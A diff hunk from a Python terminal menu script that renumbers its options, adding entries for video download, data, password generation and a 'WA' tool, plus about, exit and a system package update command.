@@ -2269,11 +2759,35 @@ def home_main () :
     elif main == '9' :
         t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
         os.system ('clear')
-        about ()
+        VidDownload ()
     elif main == '10' :
         t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
         os.system ('clear')
+        FData ()
+
     elif main == '11' :
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        os.system ('clear')
+        PassGen ()
+
+
+    elif main == '12' :
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        os.system ('clear')
+        WA ()
+
+    elif main == '13' :
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        os.system ('clear')
+        about ()
+
+    elif main == '14' :
+        t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
+        os.system ('clear')
+        exit()
+
+
+    elif main == '15' :
         t(0.1,'\n\t   \033[1;31m[   PLEASE WAIT .... ]')
         os.system ('clear')
         os.system ('apt update && apt upgrade -y')
